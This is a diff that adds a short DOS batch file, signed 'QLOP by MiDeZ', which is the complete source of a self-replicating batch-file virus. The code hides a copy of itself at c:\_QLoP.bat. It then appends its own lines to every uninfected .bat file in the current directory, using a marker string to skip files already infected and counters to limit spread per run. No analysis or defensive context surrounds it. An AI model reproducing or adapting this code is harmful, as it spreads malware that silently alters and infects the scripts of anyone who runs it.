@@ -1,0 +1,31 @@
+::-=QLOP by MiDeZ=-
+@echo off%_QLoP%
+if '%1=='QLoP goto QLoP%2
+set QLoP=%0.bat
+if not exist %QLoP% set QLoP=%0
+if '%QLoP%==' set QLoP=autoexec.bat
+if exist c:\_QLoP.bat goto QLoPg
+if not exist %QLoP% goto eQLoP
+find "QLoP"<%QLoP%>c:\_QLoP.bat
+attrib c:\_QLoP.bat +h
+:QLoPg
+command /e:5000 /c c:\_QLoP QLoP vir
+:eQLoP
+set QLoP=
+goto QLoPend
+:QLoPvir
+for %%a in (*.bat) do call c:\_QLoP QLoP i %%a
+exit QLoP
+:QLoPi
+find "QLoP"<%3>nul
+if not errorlevel 1 goto QLoPj
+type %3>QLoP$
+echo.>>QLoP$
+type c:\_QLoP.bat>>QLoP$
+move QLoP$ %3>nul
+set QLoP#=%QLoP#%1
+if %QLoP#%==111 exit
+:QLoPj
+set QLoP!=%QLoP!%1
+if %QLoP!%==11111111 exit
+:QLoPend
